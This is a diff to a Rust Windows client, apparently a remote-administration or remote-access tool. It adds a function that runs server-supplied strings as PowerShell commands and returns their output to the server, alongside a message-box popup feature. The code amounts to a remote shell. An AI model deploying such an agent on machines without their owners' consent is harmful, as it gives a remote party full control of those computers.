@@ -2,13 +2,17 @@ extern crate winapi;
 extern crate user32;
 
 use std::ffi::{CString};
+use std::fmt::format;
 use user32::MessageBoxA;
 use winapi::um::winuser::{MB_OK, MB_ICONINFORMATION};
-
-use lib::{Command, send_data};
+use std::process;
+use std::process::Stdio;
+use lib::{Command, CommandErr, send_data};
 use crate::Client;
+use serde::{Deserialize, Serialize};
 
 
+/// Parses the byte buffer into a String then runs the given command
 pub fn parse_message(client: &mut Client, command: Command, buf: Vec<u8>) {
     // TODO: remove unwrap
     let message = serde_json::from_slice(&buf).unwrap();
@@ -17,16 +21,36 @@ pub fn parse_message(client: &mut Client, command: Command, buf: Vec<u8>) {
         Command::Run => run(client, message),
         Command::Echo => echo(client, message),
         Command::Message => display_message(client, message),
-        Command::Send => receive(message),
-    };
+        Command::Send => receive(client, message),
+    }
 }
 
-pub fn receive(message: String) {
-    log::info!("Message received from server: {}", message);
+pub fn receive(client: &mut Client, message: String) {
+    log::trace!("Message received from server: {}", message);
+    send_data(Command::Send, &(), &mut client.writer).unwrap()
 }
 
 pub fn run(client: &mut Client, command: String) {
-    // TODO: implement command run logic
+    let output = process::Command::new("powershell")
+        .args(["-Command", &command])
+        .stdout(Stdio::piped())
+        .stderr(Stdio::piped())
+        .output();
+
+    let response = match output {
+        Ok(output) => {
+            if output.status.success() {
+                log::trace!("Command: {}. Successful command run {}", command, String::from_utf8_lossy(&output.stdout).to_string());
+                format!("Command executed successfully.\nResponse:\n{}", String::from_utf8(output.stdout).unwrap())
+            } else {
+                log::trace!("Command: {}. Unsuccessful command run {}", command, String::from_utf8_lossy(&output.stdout).to_string());
+                format!("Command return an error. Error message:\n{}", String::from_utf8(output.stderr).unwrap())
+            }
+        },
+        Err(err) => format!("An error occurred while running command: {}", err),
+    };
+    
+    send_data(Command::Send, &response, &mut client.writer).unwrap()
 }
 
 pub fn echo(client: &mut Client, message: String) {
@@ -67,6 +91,7 @@ pub fn message_box(title: &str, message: &str, icon_info: u32) {
         );
     }
 }
+
 
 #[cfg(test)]
 mod tests {
